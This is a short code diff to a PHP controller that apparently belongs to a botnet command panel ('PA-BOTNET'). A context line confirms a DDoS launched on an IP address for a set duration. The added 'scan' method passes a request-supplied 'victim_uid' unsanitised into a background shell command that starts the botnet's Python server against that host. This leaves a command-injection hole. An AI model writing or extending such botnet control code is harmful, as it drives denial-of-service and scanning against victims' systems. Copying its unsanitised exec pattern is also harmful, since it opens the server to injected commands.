@@ -128,4 +128,15 @@ class NetworkController extends Controller
 
         return redirect("/network/$group_id")->with('output', "DDoS lancé sur l'adresse $ip_address pour $duration secondes.");
     }
+
+    public function scan(Request $request)
+    {
+        $group_id = $request->group_id;
+        $victim_uid = $request->victim_uid;
+
+        $command = "nohup bash -c 'source /home/debian/PA-BOTNET-PYSRV/venv/bin/activate && python3 /home/debian/PA-BOTNET-PYSRV/main.py --scan --host $victim_uid > /dev/null 2>&1 &' > /dev/null 2>&1 & echo $!";
+        exec($command, $output, $return);
+
+        print_r($command);
+    }
 }
